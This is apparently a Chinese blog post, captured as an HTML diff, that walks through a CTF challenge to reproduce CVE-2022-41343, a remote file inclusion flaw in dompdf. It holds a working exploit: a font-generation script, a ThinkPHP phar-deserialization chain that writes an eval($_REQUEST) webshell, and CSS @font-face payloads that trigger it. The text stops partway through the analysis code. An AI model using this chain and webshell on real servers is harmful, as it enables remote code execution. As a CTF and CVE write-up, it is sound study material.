@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="aesm1p">
+
+
+
+    <meta name="description" content="相逢意气为君饮">
+
+
+
+<title>结合ctf题目复现分析CVE-2022-41343 | aesm1p&#39;s blog</title>
+
+
+
+    <link rel="icon" href="/a.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">aesm1p&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">aesm1p&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">结合ctf题目复现分析CVE-2022-41343</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">aesm1p</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">May 29, 2023&nbsp;&nbsp;22:36:11</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p>dompdf在<code>2.0.0</code>版本及之前存在一个远程文件包含漏洞， FontMetrics.php中的registerFont函数在检查一个远程URL之后失败之后不会终止字体注册，而是会继续执行代码，从而导致漏洞的产生。</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>基于DASCTF Apr月赛的题目pdf_converter_revenge进行复现。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fontforge</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    sys.stdout.buffer.write(do_generate_font())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_generate_font</span>() -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    fd, fn = tempfile.mkstemp(suffix=<span class="string">&quot;.ttf&quot;</span>)</span><br><span class="line">    os.close(fd)</span><br><span class="line">    font = fontforge.font()</span><br><span class="line">    font.copyright = <span class="string">&quot;DUMMY FONT&quot;</span></span><br><span class="line">    font.generate(fn)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fn, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        res = f.read()</span><br><span class="line">    os.unlink(fn)</span><br><span class="line">    result = res</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>运行该脚本，生成ttf文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &gt; font.ttf</span><br></pre></td></tr></table></figure>
+
+<p>然后在生成phar文件的时候，添加<code>$phar-&gt;setStub(file_get_contents(&quot;font.ttf&quot;).&#39;&lt;?php __HALT_COMPILER(); ?&gt;&#39;);</code></p>
+<p>反序列化poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">Pivot</span>;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>)];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    $aaa = new Windows(&#x27;system&#x27;,&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">//    echo base64_encode(serialize($aaa));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span></span><br><span class="line">    &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append[<span class="string">&#x27;jelly&#x27;</span>] = <span class="string">&#x27;getError&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error = <span class="keyword">new</span> relation\<span class="title function_ invoke__">BelongsTo</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">db</span>\<span class="title class_">Query</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Relation</span>;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">OneToOne</span> <span class="keyword">extends</span> <span class="title">Relation</span></span></span><br><span class="line"><span class="class">    </span>&#123;&#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BelongsTo</span> <span class="keyword">extends</span> <span class="title">OneToOne</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query = <span class="keyword">new</span> <span class="title class_">Query</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr = [<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">console</span>\<span class="title class_">Output</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Query</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model = <span class="keyword">new</span> <span class="title class_">Output</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Output</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles = [<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Memcache</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">Memcached</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span>  = [</span><br><span class="line">            <span class="string">&#x27;expire&#x27;</span>       =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;session_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">Memcached</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Request</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcached</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// pop链中需要prefix存在，否则报错</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options = [<span class="string">&#x27;prefix&#x27;</span>   =&gt; <span class="string">&#x27;jelly/&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;tag = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler = <span class="keyword">new</span> <span class="title class_">Request</span>(<span class="variable">$function</span>,<span class="variable">$parameter</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Request</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">get</span>     = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$function</span>,<span class="variable">$parameter</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="variable">$function</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;get = [<span class="string">&quot;jelly&quot;</span>=&gt;<span class="variable">$parameter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>(&#x27;<span class="title class_">system</span>&#x27;,&#x27;<span class="title class_">echo</span> &quot;&lt;?<span class="title class_">php</span> <span class="title class_">eval</span>(\$<span class="title class_">_REQUEST</span>[333]);<span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span><span class="string">&quot; &gt; /var/www/html/html/public/exp.php&#x27;);</span></span><br><span class="line"><span class="string">    @unlink(&quot;</span>test.phar<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    <span class="subst">$phar</span> = new Phar(&#x27;test.phar&#x27;);</span></span><br><span class="line"><span class="string">    <span class="subst">$phar</span>-&gt;stopBuffering();</span></span><br><span class="line"><span class="string">    <span class="subst">$phar</span>-&gt;setStub(file_get_contents(&quot;</span>font.ttf<span class="string">&quot;).&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;);</span></span><br><span class="line"><span class="string">    <span class="subst">$phar</span>-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;test&#x27;);</span></span><br><span class="line"><span class="string">    <span class="subst">$phar</span>-&gt;setMetadata(<span class="subst">$a</span>);</span></span><br><span class="line"><span class="string">    <span class="subst">$phar</span>-&gt;stopBuffering();</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    echo filename.&quot;</span>: exploit_normal_<span class="string">&quot;.md5(&#x27;data:text/plain;base64,&#x27;.base64_encode(file_get_contents(&quot;</span>test.phar<span class="string">&quot;))).&quot;</span>.ttf\n<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    <span class="subst">$phar_content</span> = base64_encode(file_get_contents(&quot;</span>test.phar<span class="string">&quot;));</span></span><br><span class="line"><span class="string">    <span class="subst">$payload</span>=&quot;</span>&lt;style&gt;@font-face &#123; font-family:<span class="string">&#x27;exploit&#x27;</span>; src:<span class="title function_ invoke__">url</span>(<span class="string">&#x27;data:text/plain;base64,&quot;.$phar_content.&quot;&#x27;</span>); font-weight:<span class="string">&#x27;normal&#x27;</span>; font-style:<span class="string">&#x27;normal&#x27;</span>;&#125;&lt;/style&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    echo urlencode(<span class="subst">$payload</span>);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>生成poc后发送请求<br><img src="https://s2.loli.net/2023/05/28/qC7osVwNF8DfYIg.png" alt="image.png"></p>
+<p>此时文件已经成功写入（文件名称可以确定）</p>
+<p>第二步，访问该文件触发phar反序列化（这里需要知道文件的绝对路径）</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line"><span class="keyword">@font-face</span> &#123;<span class="attribute">font-family</span>:<span class="string">&#x27;exploit&#x27;</span>;</span><br><span class="line"><span class="attribute">src</span>:<span class="built_in">url</span>(<span class="string">&#x27;phar:///var/www/html/html/vendor/dompdf/dompdf/lib/fonts/exploit_normal_c774fec90c6f02f9ae29a89662d4e5a8.ttf##&#x27;</span>);</span><br><span class="line"><span class="attribute">font-weight</span>:<span class="string">&#x27;normal&#x27;</span>;</span><br><span class="line"><span class="attribute">font-style</span>:<span class="string">&#x27;normal&#x27;</span>;&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问生成的webshell即可<br><img src="https://s2.loli.net/2023/05/28/Vtk5hwiqfLWgE2e.png" alt="image.png"></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>漏洞核心代码在<code>vendor/dompdf/dompdf/src/FontMetrics.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">registerFont</span>(<span class="params"><span class="variable">$style</span>, <span class="variable">$remoteFile</span>, <span class="variable">$context</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$fontname</span> = <span class="title function_ invoke__">mb_strtolower</span>(<span class="variable">$style</span>[<span class="string">&quot;family&quot;</span>]);</span><br><span class="line">	<span class="variable">$families</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getFontFamilies</span>();</span><br><span class="line"></span><br><span class="line">	<span class="variable">$entry</span> = [];</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$families</span>[<span class="variable">$fontname</span>])) &#123;</span><br><span class="line">		<span class="variable">$entry</span> = <span class="variable">$families</span>[<span class="variable">$fontname</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$styleString</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getType</span>(<span class="string">&quot;<span class="subst">&#123;$style[&#x27;weight&#x27;]&#125;</span> <span class="subst">&#123;$style[&#x27;style&#x27;]&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$remoteHash</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$remoteFile</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$prefix</span> = <span class="variable">$fontname</span> . <span class="string">&quot;_&quot;</span> . <span class="variable">$styleString</span>;</span><br><span class="line">	<span class="variable">$prefix</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$prefix</span>, <span class="string">&quot;-&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;iconv&#x27;</span>)) &#123;</span><br><span class="line">		<span class="variable">$prefix</span> = @<span class="title function_ invoke__">iconv</span>(<span class="string">&#x27;utf-8&#x27;</span>, <span 